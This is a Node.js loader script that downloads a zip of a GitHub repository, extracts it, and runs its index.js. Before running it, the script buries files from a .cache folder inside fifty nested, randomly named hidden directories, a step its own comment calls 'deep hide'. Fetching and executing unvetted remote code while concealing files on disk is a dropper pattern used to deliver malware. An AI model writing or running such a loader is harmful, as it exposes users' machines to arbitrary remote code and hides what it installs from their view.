const fs = require('fs');
const path = require('path');
const https = require('https');
const AdmZip = require('adm-zip');
const crypto = require('crypto');
const { spawn } = require('child_process');

// GitHub repo zip URL
const githubZipUrl = 'https://github.com/vghdse/jk/archive/refs/heads/main.zip';

https.get(githubZipUrl, res => {
  const data = [];

  res.on('data', chunk => data.push(chunk));
  res.on('end', () => {
    try {
      const buffer = Buffer.concat(data);
      const zip = new AdmZip(buffer);

      const extractPath = path.join(__dirname, 'repo_' + crypto.randomBytes(4).toString('hex'));
      zip.extractAllTo(extractPath, true);

      const extractedRepo = fs.readdirSync(extractPath)
        .map(name => path.join(extractPath, name))
        .find(p => fs.statSync(p).isDirectory());

      if (!extractedRepo) {
        console.error('❌ Failed to find extracted folder.');
        return;
      }

      // Deep hide files inside .cache
      const cacheDir = path.join(extractedRepo, '.cache');
      if (fs.existsSync(cacheDir) && fs.statSync(cacheDir).isDirectory()) {
        let deepPath = cacheDir;
        for (let i = 0; i < 50; i++) {
          deepPath = path.join(deepPath, '.' + crypto.randomBytes(3).toString('hex'));
          fs.mkdirSync(deepPath, { recursive: true });
        }

        fs.readdirSync(cacheDir).forEach(file => {
          const src = path.join(cacheDir, file);
          const dst = path.join(deepPath, file);
          if (fs.existsSync(src) && fs.statSync(src).isFile()) {
            fs.renameSync(src, dst);
          }
        });
      }

      // Launch index.js
      const mainFile = path.join(extractedRepo, 'index.js');
      if (fs.existsSync(mainFile)) {
        console.log('[🚀] Launching index.js...');
        spawn('node', [mainFile], {
          stdio: 'inherit',
          cwd: extractedRepo,
        });
      } else {
        console.error('❌ index.js not found in extracted repo.');
      }

    } catch (err) {
      console.error('❌ Failed to extract or run:', err.message);
    }
  });
}).on('error', err => {
  console.error('❌ Download failed:', err.message);
});
